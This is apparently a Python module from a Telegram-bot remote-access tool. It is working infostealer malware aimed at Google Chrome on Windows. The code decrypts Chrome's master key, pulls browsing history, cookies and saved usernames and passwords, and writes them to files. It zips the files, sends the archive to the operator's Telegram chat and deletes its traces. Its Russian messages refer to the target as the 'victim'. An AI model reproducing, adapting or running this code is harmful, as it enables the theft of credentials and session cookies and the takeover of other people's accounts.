import os
import win32crypt
import json,base64
from os.path import basename
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import shutil
import sqlite3
from aiogram import types, Dispatcher, Bot

from libs.config import TOKEN, ID

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Это не мой код!!!

async def chrome_commmand(message: types.Message):
        await bot.send_message(ID, 'Тебя, понял. Занят этим..')
        try:
            def time(date):
                try:
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
                except:
                    return "Can't decode"

            async def get_master_key_chrome():
                try:
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key_chrome = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key_chrome = master_key_chrome[5:]  
                    master_key_chrome = win32crypt.CryptUnprotectData(master_key_chrome, None, None, None, 0)[1]
                    return master_key_chrome
                except:
                    await bot.send_message(ID, 'Жертва не имеет Chrome Браузер')
            def decrypt(buff, master_key):
                try:
                    return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Can't decode"



            try:
                os.makedirs(r'C:\hesoyam8927163\Chrome')
                HistorySQL = "SELECT url FROM visits"
                HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

                data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default"
                files = os.listdir(data_path)
                history_db = os.path.join(data_path, 'history')
                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
                c = sqlite3.connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
                cursor = c.cursor()
                temp = []
                with open(rf"C:\hesoyam8927163\Chrome\history-chrome.txt", "a", encoding="utf-8") as history:
                    for result in cursor.execute(HistorySQL).fetchall():
                        data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                        result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
                        if result in temp:
                            continue
                        temp.append(result)
                        history.write(result)
                    history.close()
                try:
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
                except:
                    pass
         

                CookiesSQL = "SELECT * FROM cookies"
                data_path = os.path.expanduser('~')+r"\AppData\Local\Google\Chrome\User Data\Default\Network"
                files = os.listdir(data_path)
                history_db = os.path.join(data_path, 'Cookies')
                shutil.copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                cursor = c.cursor()
                
                
                results = '[\n'

                result = cursor.execute(CookiesSQL).fetchall()

                for result in cursor.execute(CookiesSQL).fetchall():
                    if result[8] == 0:
                        secure = False
                    else:
                        secure = True

                    if result[9] == 0:
                        http = False
                    else:
                        http = True
                    results += '''
            {
                "domain": "%s",
                "expirationDate": %s,
                "name": "%s",
                "httpOnly": %s,
                "path": "%s",
                "secure": %s,
                "value": "%s"
            },
                    '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))

                with open(rf"C:\hesoyam8927163\Chrome\Cookies-Chrome.json", "a", encoding="utf-8") as cookies:
                    results = results.replace('True', 'true')
                    results = results.replace('False', 'false')
                    results += '\n]'
                    cookies.write(results)

                cookies.close()
                try:
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies.db')
                except:
                    pass
            except:
                pass

            try:
                def get_master_key():
                    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
                        local_state = f.read()
                        local_state = json.loads(local_state)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]  
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key


                def decrypt_payload(cipher, payload):
                    return cipher.decrypt(payload)


                def generate_cipher(aes_key, iv):
                    return AES.new(aes_key, AES.MODE_GCM, iv)


                def decrypt_password(buff, master_key):
                    try:
                        iv = buff[3:15]
                        payload = buff[15:]
                        cipher = generate_cipher(master_key, iv)
                        decrypted_pass = decrypt_payload(cipher, payload)
                        decrypted_pass = decrypted_pass[:-16].decode()  
                        return decrypted_pass
                    except:

                        return "Chrome < 80"    
            except:
                await bot.send_message(ID, 'Жертва не имеет Chrome Браузер')

            try:
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
                shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
                conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                cursor = conn.cursor()
                
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)

                    alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                    with open(r'C:\hesoyam8927163\Chrome\chrome-passwords.txt', "a") as o:
                        o.write(alldatapass)

                shutil.make_archive('chrome', 'zip', 'C:\\hesoyam8927163\\Chrome')

                await bot.send_document(ID, open('chrome.zip', 'rb'))
                try:
                    os.remove('chrome.zip')
                    shutil.rmtree('C:\\hesoyam8927163')
                    os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
                except Exception as e:
                    print(e)
            except Exception as e:
                print(e)
        except:
            await bot.send_message(ID, 'Что-то пошло не так, скорее всего у жертвы нету Chrome :(')